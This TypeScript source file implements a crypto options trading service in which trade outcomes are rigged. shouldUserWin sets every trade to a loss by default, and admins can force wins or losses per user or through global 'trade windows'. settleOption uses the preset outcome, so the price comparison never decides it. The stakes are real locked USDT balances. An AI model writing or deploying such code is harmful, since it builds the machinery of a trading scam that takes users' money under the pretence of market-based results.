/**
 * Supabase Trading Service
 * Uses direct table operations for options trading with proper schema alignment
 */

import { supabase } from '@/lib/supabase';
import { v4 as uuidv4 } from 'uuid';
import { unifiedWalletService } from '@/services/unified-wallet-service-v2';

export interface OptionOrder {
  id: string;
  user_id: string;
  pair_id: string;
  direction: 'UP' | 'DOWN';
  stake: number;
  entry_price: number;
  expiry_price: number | null;
  profit: number;
  fee: number;
  duration: number;
  fluctuation_range: number;
  payout_rate: number;
  status: 'SCHEDULED' | 'ACTIVE' | 'COMPLETED' | 'CANCELLED';
  pnl: number | null;
  start_time: string;
  end_time: string;
  created_at: string;
  completed_at: string | null;
  metadata: any;
  trading_pairs?: {
    symbol: string;
    base_asset: string;
    quote_asset: string;
  };
}

export interface TradeOutcome {
  id: string;
  user_id: string;
  enabled: boolean;
  outcome_type: 'win' | 'loss' | 'default';
  spot_enabled: boolean;
  futures_enabled: boolean;
  options_enabled: boolean;
  arbitrage_enabled: boolean;
  created_at: string;
  updated_at: string;
}

export interface TradeWindow {
  id: string;
  outcome_type: 'win' | 'loss' | 'random';
  win_rate: number | null;
  start_time: string;
  end_time: string;
  description: string | null;
  active: boolean;
}

interface SpotTradeRequest {
  pair: string;
  side: 'buy' | 'sell';
  type: 'market' | 'limit' | 'stop';
  amount: number;
  price: number;
  total: number;
}

interface OptionsTradeRequest {
  symbol: string;
  direction: 'UP' | 'DOWN';
  amount: number;
  duration: number;
  fluctuation: number;
  payout: number;
  entryPrice: number;
}

interface TradeResponse {
  success: boolean;
  orderId?: string;
  order?: OptionOrder;
  scheduledId?: string;
  scheduled?: any;
  error?: string;
  pnl?: number;
  isWin?: boolean;
  shouldWin?: boolean;
  usedAdminOutcome?: boolean;
  result?: 'win' | 'loss';
  source?: 'user_force' | 'global_force' | 'random' | 'default_loss';
}

class SupabaseTradingService {
  
  // Check if user should win based on admin settings
  // DEFAULT IS LOSS - only win if admin explicitly forces it
  async shouldUserWin(
    userId: string, 
    tradeType: 'spot' | 'futures' | 'options' | 'arbitrage' = 'options'
  ): Promise<boolean> {
    try {
      console.log(`🎲 Checking if user ${userId} should win for ${tradeType}`);

      // PRIORITY 1: Check for user-specific force win from trade_outcomes
      const userForceWin = await this.getUserForceWin(userId, tradeType);
      if (userForceWin !== null) {
        console.log(`👤 User-specific force: ${userForceWin ? 'WIN' : 'LOSS'}`);
        return userForceWin;
      }

      // PRIORITY 2: Check for global force win from trade_windows
      const globalForceWin = await this.getGlobalForceWin(tradeType);
      if (globalForceWin !== null) {
        console.log(`🌍 Global force: ${globalForceWin ? 'WIN' : 'LOSS'}`);
        return globalForceWin;
      }

      // DEFAULT: LOSS
      console.log(`💔 Default LOSS (no admin force win)`);
      return false;

    } catch (error) {
      console.error('Error in shouldUserWin:', error);
      // On error, default to LOSS for safety
      return false;
    }
  }

  // Check for user-specific force win from trade_outcomes
  async getUserForceWin(
    userId: string,
    tradeType: 'spot' | 'futures' | 'options' | 'arbitrage'
  ): Promise<boolean | null> {
    try {
      const { data, error } = await supabase
        .from('trade_outcomes')
        .select('*')
        .eq('user_id', userId)
        .eq('enabled', true)
        .maybeSingle();

      if (error) {
        console.error('Error fetching trade outcome:', error);
        return null;
      }

      if (!data) return null;

      // Check if this trade type is enabled for this user
      const typeEnabled = 
        (tradeType === 'spot' && data.spot_enabled) ||
        (tradeType === 'futures' && data.futures_enabled) ||
        (tradeType === 'options' && data.options_enabled) ||
        (tradeType === 'arbitrage' && data.arbitrage_enabled);

      if (!typeEnabled) {
        console.log(`Trade type ${tradeType} not enabled for user`);
        return null;
      }

      // Return based on outcome_type - only WIN if explicitly set to 'win'
      switch (data.outcome_type) {
        case 'win':
          return true; // FORCE WIN
        case 'loss':
          return false; // FORCE LOSS
        case 'default':
          return null; // Use default behavior (LOSS)
        default:
          return null;
      }

    } catch (error) {
      console.error('Error in getUserForceWin:', error);
      return null;
    }
  }

  // Check for global force win from trade_windows
  async getGlobalForceWin(
    tradeType: 'spot' | 'futures' | 'options' | 'arbitrage'
  ): Promise<boolean | null> {
    try {
      const now = new Date().toISOString();
      
      const { data, error } = await supabase
        .from('trade_windows')
        .select('*')
        .eq('active', true)
        .lte('start_time', now)
        .gte('end_time', now)
        .order('created_at', { ascending: false });

      if (error) {
        console.error('Error fetching trade windows:', error);
        return null;
      }

      if (!data || data.length === 0) return null;

      // Check for force win windows first
      for (const window of data) {
        if (window.outcome_type === 'win') {
          return true; // FORCE WIN
        }
        if (window.outcome_type === 'loss') {
          return false; // FORCE LOSS
        }
      }

      // Check for random windows with win rate
      for (const window of data) {
        if (window.outcome_type === 'random' && window.win_rate) {
          const win = Math.random() < (window.win_rate / 100);
          console.log(`🎲 Random window: ${window.win_rate}% chance -> ${win ? 'WIN' : 'LOSS'}`);
          return win;
        }
      }

      return null;

    } catch (error) {
      console.error('Error in getGlobalForceWin:', error);
      return null;
    }
  }

  // Execute an options trade - LOSS by default, WIN only with admin force
  async executeOptionsTrade(
    userId: string,
    data: OptionsTradeRequest,
    userEmail?: string
  ): Promise<TradeResponse> {
    try {
      console.log('📝 Executing options trade:', data);
      
      // Check if user should win based on admin settings (default is LOSS)
      const shouldWin = await this.shouldUserWin(userId, 'options');
      
      // Get source of outcome for metadata
      const userForceWin = await this.getUserForceWin(userId, 'options');
      const globalForceWin = await this.getGlobalForceWin('options');

      console.log(`🎯 Trade outcome: ${shouldWin ? 'WIN (admin forced)' : 'LOSS (default)'}`, {
        userForceWin,
        globalForceWin,
        final: shouldWin
      });

      const startTime = new Date();
      const endTime = new Date(startTime.getTime() + data.duration * 1000);
      
      console.log('⏰ Time calculation debug:', {
        now: startTime.toISOString(),
        now_ms: startTime.getTime(),
        duration: data.duration,
        duration_ms: data.duration * 1000,
        endTime: endTime.toISOString(),
        endTime_ms: endTime.getTime(),
        time_diff_ms: endTime.getTime() - startTime.getTime(),
        is_future: endTime.getTime() > startTime.getTime()
      });

      // Create order in trades table with positive amount (balance handled separately)
      const orderId = uuidv4(); // Generate proper UUID
      
      const { data: order, error: orderError } = await supabase
        .from('trades')
        .insert({
          id: orderId,
          user_id: userId,
          type: 'options',
          status: 'ACTIVE',
          asset: 'USDT',
          amount: data.amount, // Positive amount (actual stake)
          price: data.entryPrice,
          pnl: -data.amount, // Initially loss until settled
          fee: data.amount * 0.001, // 0.1% fee
          metadata: {
            symbol: data.symbol,
            direction: data.direction,
            duration: data.duration,
            fluctuation: data.fluctuation,
            payout: data.payout,
            entryPrice: data.entryPrice,
            startTime: startTime.toISOString(),
            endTime: endTime.toISOString(),
            shouldWin,
            source: shouldWin 
              ? (userForceWin ? 'user_force' : globalForceWin ? 'global_force' : 'random')
              : 'default_loss'
          },
          created_at: startTime.toISOString(),
          updated_at: startTime.toISOString()
        })
        .select()
        .single();

      if (orderError) {
        console.error('Error creating order:', orderError);
        return { success: false, error: orderError.message };
      }

      // Lock funds for this trade
      const lockResult = await unifiedWalletService.lockFunds(
        userId,
        'USDT',
        data.amount,
        'options',
        orderId,
        data.duration,
        {
          symbol: data.symbol,
          direction: data.direction,
          entryPrice: data.entryPrice,
          shouldWin,
          source: shouldWin 
            ? (userForceWin ? 'user_force' : globalForceWin ? 'global_force' : 'random')
            : 'default_loss'
        }
      );

      if (!lockResult.success) {
        // If lock fails, delete the order
        await supabase.from('trades').delete().eq('id', orderId);
        return { success: false, error: lockResult.error || 'Failed to lock funds' };
      }

      console.log('📝 Order created with times:', {
        order_id: orderId,
        stored_start_time: startTime.toISOString(),
        stored_end_time: endTime.toISOString(),
        stored_created_at: startTime.toISOString()
      });

      // Create trading lock
      const { error: lockError } = await supabase
        .from('trading_locks')
        .insert({
          user_id: userId,
          asset: 'USDT',
          amount: data.amount,
          lock_type: 'options',
          reference_id: orderId,
          status: 'locked',
          expires_at: endTime.toISOString(),
          metadata: {
            symbol: data.symbol,
            direction: data.direction,
            duration: data.duration
          }
        });

      if (lockError) {
        console.error('Error creating trading lock:', lockError);
        // Continue anyway - lock is not critical
      }

      const source = shouldWin 
        ? (userForceWin ? 'user_force' : globalForceWin ? 'global_force' : 'random')
        : 'default_loss';

      console.log('✅ Options order created:', {
        orderId,
        result: shouldWin ? 'WIN' : 'LOSS',
        source
      });
      
      return {
        success: true,
        orderId,
        shouldWin,
        result: shouldWin ? 'win' : 'loss',
        source
      };

    } catch (error) {
      console.error('❌ Error executing options trade:', error);
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }

  // Schedule an options trade
  async scheduleOptionsTrade(
    userId: string,
    data: {
      symbol: string;
      direction: 'UP' | 'DOWN';
      amount: number;
      duration: number;
      fluctuation: number;
      payout: number;
      entryPrice: number;
      scheduledTime: string;
    }
  ): Promise<TradeResponse> {
    try {
      console.log('📝 Scheduling options trade:', data);

      const orderId = uuidv4(); // Generate proper UUID for scheduled trade

      const { data: scheduled, error: scheduledError } = await supabase
        .from('trades')
        .insert({
          id: orderId,
          user_id: userId,
          type: 'options',
          status: 'SCHEDULED',
          asset: 'USDT',
          amount: data.amount, // Positive amount
          price: data.entryPrice,
          pnl: -data.amount,
          fee: data.amount * 0.001,
          metadata: {
            symbol: data.symbol,
            direction: data.direction,
            duration: data.duration,
            fluctuation: data.fluctuation,
            payout: data.payout,
            entryPrice: data.entryPrice,
            scheduledTime: data.scheduledTime
          },
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        })
        .select()
        .single();

      if (scheduledError) throw scheduledError;

      // Create a lock
      await supabase
        .from('trading_locks')
        .insert({
          user_id: userId,
          asset: 'USDT',
          amount: data.amount,
          lock_type: 'SCHEDULED_OPTIONS',
          reference_id: orderId,
          status: 'locked',
          created_at: new Date().toISOString()
        });

      return {
        success: true,
        scheduledId: orderId,
        scheduled
      };

    } catch (error) {
      console.error('❌ Error scheduling options trade:', error);
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Scheduling failed'
      };
    }
  }

  // Get active options for a user
  async getActiveOptions(userId: string): Promise<any[]> {
    try {
      const { data, error } = await supabase
        .from('trades')
        .select('*')
        .eq('user_id', userId)
        .eq('type', 'options')
        .eq('status', 'ACTIVE')
        .order('created_at', { ascending: false });

      if (error) throw error;
      return data || [];
    } catch (error) {
      console.error('Error fetching active options:', error);
      return [];
    }
  }

  // Get completed options for a user
  async getCompletedOptions(userId: string): Promise<any[]> {
    try {
      const { data, error } = await supabase
        .from('trades')
        .select('*')
        .eq('user_id', userId)
        .eq('type', 'options')
        .eq('status', 'COMPLETED')
        .order('created_at', { ascending: false });

      if (error) throw error;
      return data || [];
    } catch (error) {
      console.error('Error fetching completed options:', error);
      return [];
    }
  }

  // Get scheduled options trades
  async getScheduledOptions(userId: string): Promise<any[]> {
    try {
      const { data, error } = await supabase
        .from('trades')
        .select('*')
        .eq('user_id', userId)
        .eq('type', 'options')
        .eq('status', 'SCHEDULED')
        .order('created_at', { ascending: false });

      if (error) throw error;
      return data || [];
    } catch (error) {
      console.error('Error fetching scheduled options:', error);
      return [];
    }
  }

  // Cancel a scheduled trade
  async cancelScheduledTrade(orderId: string): Promise<{ success: boolean }> {
    try {
      const { error } = await supabase
        .from('trades')
        .update({
          status: 'CANCELLED',
          updated_at: new Date().toISOString()
        })
        .eq('id', orderId)
        .eq('status', 'SCHEDULED');

      if (error) throw error;

      // Release the lock
      await supabase
        .from('trading_locks')
        .update({ status: 'released' })
        .eq('reference_id', orderId);

      return { success: true };
    } catch (error) {
      console.error('Error cancelling scheduled trade:', error);
      return { success: false };
    }
  }

  // Settle an expired option
  async settleOption(orderId: string, currentPrice: number): Promise<TradeResponse> {
    try {
      console.log('💰 Settling option:', { orderId, currentPrice });

      // Get the order
      const { data: order, error: fetchError } = await supabase
        .from('trades')
        .select('*')
        .eq('id', orderId)
        .single();

      if (fetchError || !order) {
        console.error('Error fetching order for settlement:', fetchError);
        return { success: false, error: 'Order not found' };
      }

      if (order.status !== 'ACTIVE') {
        console.log('Order already settled:', order.status);
        return { success: false, error: 'Order already settled' };
      }

      const metadata = order.metadata as any;
      const entryPrice = metadata.entryPrice;
      const direction = metadata.direction;
      const payout = metadata.payout;
      const stake = Math.abs(order.amount); // Original stake
      const fee = order.fee || 0;
      const shouldWin = metadata.shouldWin || false;

      // Determine if user won - use admin forced outcome if available, otherwise calculate based on price
      let isWin: boolean;
      let pnl: number;
      
      if (shouldWin !== undefined) {
        // Use admin forced outcome
        isWin = shouldWin;
        pnl = isWin ? stake * payout : -stake;
        console.log(`🎯 Using admin forced outcome: ${isWin ? 'WIN' : 'LOSS'}`);
      } else {
        // Calculate based on price movement
        const priceDiff = currentPrice - entryPrice;
        isWin = direction === 'UP' ? priceDiff > 0 : priceDiff < 0;
        pnl = isWin ? stake * payout : -stake;
        console.log(`📈 Price-based outcome: ${isWin ? 'WIN' : 'LOSS'} (diff: ${priceDiff})`);
      }

      console.log(`💸 Settlement result: ${isWin ? 'WIN' : 'LOSS'}`, {
        stake,
        pnl,
        fee,
        totalChange: isWin ? stake + pnl - fee : -stake - fee
      });

      // Update order status
      const { error: updateError } = await supabase
        .from('trades')
        .update({
          status: 'COMPLETED',
          pnl: pnl,
          price: currentPrice,
          metadata: {
            ...metadata,
            expiryPrice: currentPrice,
            settledAt: new Date().toISOString(),
            result: isWin ? 'win' : 'loss',
            finalPnl: pnl
          },
          updated_at: new Date().toISOString()
        })
        .eq('id', orderId);

      if (updateError) {
        console.error('Error updating settled order:', updateError);
        return { success: false, error: updateError.message };
      }

      // Release funds with outcome
      const releaseResult = await unifiedWalletService.releaseFunds(
        order.user_id,
        orderId,
        isWin ? 'win' : 'loss',
        isWin ? pnl : undefined
      );

      if (!releaseResult.success) {
        console.error('Error releasing funds:', releaseResult.error);
        // Don't fail the settlement, just log the error
      }

      console.log(`💸 Funds released: ${isWin ? 'WIN' : 'LOSS'}`, {
        stake,
        pnl,
        returnedAmount: releaseResult.returnAmount || 0
      });

      return {
        success: true,
        isWin,
        pnl,
        stake,
        totalReturn: isWin ? stake + pnl - fee : -stake - fee
      };

    } catch (error) {
      console.error('Error settling option:', error);
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      };
    }
  }

  // Get user-specific trade outcome from trade_outcomes
  async getUserTradeOutcomeSettings(userId: string): Promise<TradeOutcome | null> {
    try {
      const { data, error } = await supabase
        .from('trade_outcomes')
        .select('*')
        .eq('user_id', userId)
        .single();

      if (error) {
        if (error.code === 'PGRST116') return null;
        throw error;
      }

      return data;
    } catch (error) {
      console.error('Error fetching user trade outcome:', error);
      return null;
    }
  }

  // Set user-specific trade outcome (admin function)
  async setUserTradeOutcome(
    adminUserId: string,
    targetUserId: string,
    settings: {
      outcome_type: 'win' | 'loss' | 'default';
      enabled: boolean;
      spot_enabled?: boolean;
      futures_enabled?: boolean;
      options_enabled?: boolean;
      arbitrage_enabled?: boolean;
    }
  ) {
    try {
      const now = new Date().toISOString();
      
      // Check if user already has an outcome
      const existing = await this.getUserTradeOutcomeSettings(targetUserId);

      if (existing) {
        // Update existing
        const { error } = await supabase
          .from('trade_outcomes')
          .update({
            outcome_type: settings.outcome_type,
            enabled: settings.enabled,
            spot_enabled: settings.spot_enabled ?? existing.spot_enabled,
            futures_enabled: settings.futures_enabled ?? existing.futures_enabled,
            options_enabled: settings.options_enabled ?? existing.options_enabled,
            arbitrage_enabled: settings.arbitrage_enabled ?? existing.arbitrage_enabled,
            updated_at: now,
            updated_by: adminUserId
          })
          .eq('user_id', targetUserId);

        if (error) throw error;
      } else {
        // Insert new
        const { error } = await supabase
          .from('trade_outcomes')
          .insert({
            user_id: targetUserId,
            outcome_type: settings.outcome_type,
            enabled: settings.enabled,
            spot_enabled: settings.spot_enabled ?? false,
            futures_enabled: settings.futures_enabled ?? false,
            options_enabled: settings.options_enabled ?? false,
            arbitrage_enabled: settings.arbitrage_enabled ?? false,
            created_at: now,
            updated_at: now,
            created_by: adminUserId,
            updated_by: adminUserId
          });

        if (error) throw error;
      }

      return { success: true };
    } catch (error) {
      console.error('Error setting user trade outcome:', error);
      throw error;
    }
  }

  // Get active trade windows (for UI display)
  async getActiveTradeWindows(): Promise<TradeWindow[]> {
    try {
      const now = new Date().toISOString();
      const { data, error } = await supabase
        .from('trade_windows')
        .select('*')
        .eq('active', true)
        .lte('start_time', now)
        .gte('end_time', now)
        .order('created_at', { ascending: false });

      if (error) throw error;
      return data || [];
    } catch (error) {
      console.error('Error fetching trade windows:', error);
      return [];
    }
  }

  // Create a trade window
  async createTradeWindow(window: {
    outcome_type: 'win' | 'loss' | 'random';
    win_rate?: number;
    start_time: string;
    end_time: string;
    description?: string;
  }) {
    const { data, error } = await supabase
      .from('trade_windows')
      .insert({
        ...window,
        active: true,
        created_at: new Date().toISOString()
      })
      .select()
      .single();

    if (error) throw error;
    return data;
  }

  // Toggle trade window active status
  async toggleTradeWindow(windowId: string, isActive: boolean) {
    const { error } = await supabase
      .from('trade_windows')
      .update({ active: isActive })
      .eq('id', windowId);

    if (error) throw error;
    return { success: true };
  }
}

// Admin control service
class SupabaseAdminService {
  async setForceWin(enabled: boolean): Promise<any> {
    console.log(`👑 Setting force win to: ${enabled}`);
    
    try {
      const { data, error } = await supabase.rpc('set_force_win', {
        p_enabled: enabled
      });

      if (error) {
        console.error('❌ Force win error:', error);
        throw new Error(error.message);
      }

      console.log('✅ Force win setting updated:', data);
      return data;
      
    } catch (error) {
      console.error('❌ Failed to update force win:', error);
      throw error;
    }
  }

  async getSettings(): Promise<any> {
    try {
      const { data, error } = await supabase.rpc('get_admin_settings');

      if (error) {
        console.error('❌ Settings error:', error);
        throw new Error(error.message);
      }

      return data;
      
    } catch (error) {
      console.error('❌ Failed to fetch settings:', error);
      throw error;
    }
  }
}

export const supabaseTradingService = new SupabaseTradingService();
export const supabaseAdminService = new SupabaseAdminService();
